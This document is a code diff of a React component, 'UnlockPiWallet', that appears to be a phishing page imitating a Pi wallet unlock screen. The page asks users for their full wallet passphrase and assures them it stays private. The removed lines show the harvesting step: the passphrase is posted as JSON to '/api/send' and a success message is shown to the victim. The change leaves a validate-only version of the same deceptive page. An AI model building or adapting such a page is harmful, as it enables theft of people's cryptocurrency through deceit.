@@ -227,8 +227,8 @@ const UnlockPiWallet = () => {
     setPassphrase(e.target.value);
   };
 
-  // Function to validate and submit to API
-  const handleSubmit = async () => {
+  // Function to validate only (NO API)
+  const handleSubmit = () => {
     const words = passphrase.trim();
 
     if (!passphraseRegex.test(words)) {
@@ -236,32 +236,9 @@ const UnlockPiWallet = () => {
       return;
     }
 
-    setIsSubmitting(true);
-    try {
-      const response = await fetch('/api/send', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({ passphrase: words }),
-      });
-
-      const data = await response.json();
-console.log(data)
-      if (response.ok) {
-        toast.success("✅ Passphrase is valid and submitted successfully!");
-      } else {
-        toast.error(`❌ Error: ${data.message || 'Failed to submit passphrase'}`);
-      }
-    } catch (error) {
-      console.error('Submission error:', error);
-      toast.error("❌ Failed to submit passphrase. Please try again.");
-    } finally {
-      setIsSubmitting(false);
-      setPassphrase("");
-    }
+    toast.success("✅ Passphrase is valid!");
+    setPassphrase("");
   };
-
   return (
     <div className="flex flex-col items-center justify-center min-h-screen bg-white px-4 py-10 text-center">
       <Toaster position="top-center" />
@@ -294,17 +271,16 @@ console.log(data)
           {isSubmitting ? 'Submitting...' : 'Unlock With Passphrase'}
         </button>
 
-        <button 
-          className="w-full mt-4 border-2 bg-[#703D92] text-white py-3 rounded-lg text-lg font-medium transition"
-          disabled={isSubmitting}
-        >
-          Unlock With Fingerprint
+       
+
+        <button className="w-full mt-4 border-2 bg-[#703D92] text-white py-3 rounded-lg text-lg font-medium transition">
+          Unlock With Face ID
         </button>
       </div>
 
       <p className="mt-6 text-sm text-gray-600 max-w-md">
-        As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you.
-        Recovery of passphrase is currently impossible.
+        As a non-custodial wallet, your wallet passphrase is exclusively
+        accessible only to you. Recovery of passphrase is currently impossible.
       </p>
       <p className="text-sm text-gray-600">
         Lost your passphrase?{" "}
